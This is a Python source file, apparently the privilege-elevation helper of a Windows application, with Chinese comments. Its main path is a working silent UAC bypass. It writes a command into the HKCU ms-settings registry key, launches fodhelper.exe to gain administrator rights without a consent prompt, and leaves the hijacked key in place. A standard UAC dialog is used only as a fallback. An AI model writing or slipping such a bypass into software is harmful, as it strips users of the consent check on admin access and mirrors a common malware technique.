# src/utils/uac_elevator.py
# UAC 提权模块：自动检测权限并提权（优先静默绕过，失败回退弹 UAC）
#
# 使用方式:
#   from src.utils.system.uac_elevator import elevate
#   elevate(__file__)
#
# 提权后会在环境变量 OSEASY_PRIV_METHOD 中记录方式:
#   "bypass"    - Fodhelper 注册表绕过（静默）
#   "uac_dialog" - 标准 UAC 弹窗确认
#   "manifest"   - 打包 manifest 提权 / 原本就是管理员

import os
import sys
import ctypes

CMD = r"C:\Windows\System32\cmd.exe"
FOD_HELPER = r"C:\Windows\System32\fodhelper.exe"
REG_PATH = r"Software\Classes\ms-settings\shell\open\command"
UAC_BYPASS_FLAG_FILE = "__uac_bypass__"
UAC_DIALOG_FLAG = "--uac-dialog"


def is_admin() -> bool:
    """检测当前进程是否以管理员权限运行"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _create_reg_key(key: str, value: str) -> None:
    """创建/写入注册表键值"""
    try:
        import winreg
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE
        )
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
    except Exception:
        raise


def _try_bypass_uac(entry_script: str) -> bool:
    """
    尝试通过 fodhelper.exe 注册表劫持绕过 UAC。
    完全按照知乎文章方案：cmd.exe /k python main.py
    """
    if sys.argv[-1] == UAC_BYPASS_FLAG_FILE:
        return False

    try:
        current_dir = os.path.abspath(entry_script)
        cmd = '{} /k {} {}'.format(CMD, sys.executable, current_dir)
        _create_reg_key("DelegateExecute", "")
        _create_reg_key(None, cmd)
        os.system(FOD_HELPER)
        return True
    except Exception:
        return False


def _try_uac_dialog() -> None:
    """通过 ShellExecuteW(runas) 弹出标准 UAC 提权对话框"""
    try:
        argv = " ".join(f'"{a}"' if " " in a else a for a in sys.argv)
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            f"{argv} {UAC_DIALOG_FLAG}", None, 1
        )
    except Exception:
        pass


def _set_priv_method() -> None:
    """根据命令行标记设置环境变量，记录本次提权方式"""
    if is_admin():
        if sys.argv[-1] == UAC_BYPASS_FLAG_FILE:
            os.environ["OSEASY_PRIV_METHOD"] = "bypass"
        elif UAC_DIALOG_FLAG in sys.argv:
            os.environ["OSEASY_PRIV_METHOD"] = "uac_dialog"
        else:
            os.environ["OSEASY_PRIV_METHOD"] = "manifest"


def elevate(entry_script: str) -> None:
    """
    自动提权入口。调用后若当前非管理员：
      1. 先尝试 fodhelper 静默绕过
      2. 失败则弹 UAC
      3. 都失败则继续以普通权限运行

    调用方在调用后应继续正常启动逻辑。

    :param entry_script: 入口脚本路径（通常传 __file__）
    """
    if is_admin():
        _set_priv_method()
        return

    # 方案 A：静默绕过
    if _try_bypass_uac(entry_script):
        sys.exit(0)

    # 方案 B：UAC 弹窗
    _try_uac_dialog()
    sys.exit(0)
